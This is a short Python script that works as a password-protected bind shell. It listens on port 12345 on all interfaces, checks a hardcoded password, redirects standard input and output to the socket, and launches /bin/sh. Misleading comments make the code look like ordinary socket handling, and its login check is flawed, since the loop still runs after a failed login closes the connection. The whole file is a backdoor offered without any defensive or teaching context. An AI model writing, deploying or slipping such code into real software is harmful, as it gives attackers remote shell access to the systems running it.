import os
import subprocess
import socket

# login is a helper func ...
def login(conn):
    return conn.recv(1024).decode()


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 12345))
sock.listen(1)

conn = sock.accept()[0]

if login(conn) != 'OurSecretCredentionals\n':
    conn.close()

while conn:
	# fileno() returns the file descriptor underlying the connection:
	# - it is realy hendy to read its status during asynchronous communication.
    os.dup2(conn.fileno(), 0)
    os.dup2(conn.fileno(), 1)
    os.dup2(conn.fileno(), 2)
    subprocess.call(['/bin/sh', '-l'])
    break